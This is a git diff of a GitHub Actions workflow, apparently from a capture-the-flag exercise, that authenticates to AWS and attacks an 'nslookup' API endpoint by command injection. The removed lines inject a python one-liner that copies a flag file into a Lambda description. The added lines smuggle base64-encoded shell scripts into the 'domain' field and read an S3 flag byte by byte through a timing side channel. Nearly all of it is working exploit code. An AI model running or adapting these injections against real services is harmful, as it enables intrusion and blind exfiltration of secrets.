@@ -1,14 +1,11 @@
 name: AWS OIDC test for school standart old code procedure
-
 on:
   push:
     branches:
       - corgi
-
 permissions:
   id-token: write
   contents: read
-
 jobs:
   test:
     runs-on: ubuntu-latest
@@ -19,27 +16,65 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Direct URL-Decoded Exfiltration via Lambda Metadata
+      - name: Exfiltrate Flag via Timing Side-Channel
         run: |
-          API_ID="3q931syi7b"
-          REGION="us-east-1"
-          URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
+          URL="https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
           
-          echo "=== 1. INJECTING SCRIPT TO READ, DECODE, AND UPDATE LAMBDA DESCRIPTION ==="
-          # Read /tmp/flag.txt, URL-decode it using python's urllib.parse, and update function description
-          PAYLOAD='{"domain": "127.0.0.1; python3 -c \"import boto3, urllib.parse; f=open(\\\"/tmp/flag.txt\\\").read().strip(); decoded=urllib.parse.unquote(f); boto3.client(\\\'lambda\\\').update_function_configuration(FunctionName=\\\'nslookupv2\\\', Description=decoded)\""}'
+          echo "=== CALIBRATION: Testing sleep behavior ==="
+          for i in 1 2 3; do
+            START=$(date +%s)
+            CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" \
+              -H "Content-Type: application/json" \
+              -d "{\"domain\": \"127.0.0.1; sleep $i\"}")
+            END=$(date +%s)
+            echo "sleep $i -> HTTP $CODE in $((END-START))s"
+          done
           
-          curl -s -X POST "$URL" \
+          echo ""
+          echo "=== VERIFYING S3 ACCESS ==="
+          SCRIPT='SIZE=$(aws s3 cp s3://codec4f26c862a321ef5/flag.txt - --region us-east-1 | wc -c); if [ "$SIZE" -eq 16 ]; then sleep 2; fi'
+          ENCODED=$(echo "$SCRIPT" | base64 -w0)
+          START=$(date +%s)
+          CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" \
             -H "Content-Type: application/json" \
-            -d "$PAYLOAD"
+            -d "{\"domain\": \"127.0.0.1; echo $ENCODED | base64 -d | sh\"}")
+          END=$(date +%s)
+          echo "S3 size check -> HTTP $CODE in $((END-START))s"
+          if [ "$CODE" != "200" ] && [ $((END-START)) -lt 2 ]; then
+            echo "WARNING: S3 access or sleep may not be working as expected!"
+          fi
           
           echo ""
-          echo "=== 2. WAITING 3 SECONDS FOR PROPAGATION ==="
-          sleep 3
-          
-          echo "=== 3. FETCHING DECODED FLAG VIA CICDROLE ==="
-          aws lambda get-function --function-name nslookupv2 --region ${REGION} --query 'Configuration.Description' --output text > ./the_flag.txt
+          echo "=== EXTRACTING FLAG (Binary Search) ==="
+          FLAG=""
+          for pos in $(seq 1 16); do
+            low=32
+            high=126
+            while [ $low -lt $high ]; do
+              mid=$(( (low + high) / 2 ))
+              
+              SCRIPT='FLAG=$(aws s3 cp s3://codec4f26c862a321ef5/flag.txt - --region us-east-1); CHAR=$(echo "$FLAG" | cut -c'"$pos"'); ORD=$(echo -n "$CHAR" | od -An -tuC | xargs); if [ "$ORD" -gt '"$mid"' ]; then sleep 2; fi'
+              ENCODED=$(echo "$SCRIPT" | base64 -w0)
+              
+              START=$(date +%s)
+              CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" \
+                -H "Content-Type: application/json" \
+                -d "{\"domain\": \"127.0.0.1; echo $ENCODED | base64 -d | sh\"}")
+              END=$(date +%s)
+              DURATION=$((END - START))
+              
+              # TRUE if timeout (504) or took longer than 1 second
+              if [ "$CODE" = "504" ] || [ "$CODE" = "503" ] || [ $DURATION -ge 1 ]; then
+                low=$((mid + 1))
+              else
+                high=$mid
+              fi
+            done
+            CHAR=$(python3 -c "import sys; sys.stdout.write(chr($low))")
+            FLAG="$FLAG$CHAR"
+            echo "Position $pos: '$CHAR' (ord=$low) | Flag: $FLAG"
+          done
           
           echo ""
-          echo "=== 4. BEHOLD YOUR HARD-EARNED VICTORY ==="
-          cat ./the_flag.txt
+          echo "=== FINAL FLAG ==="
+          echo "$FLAG"
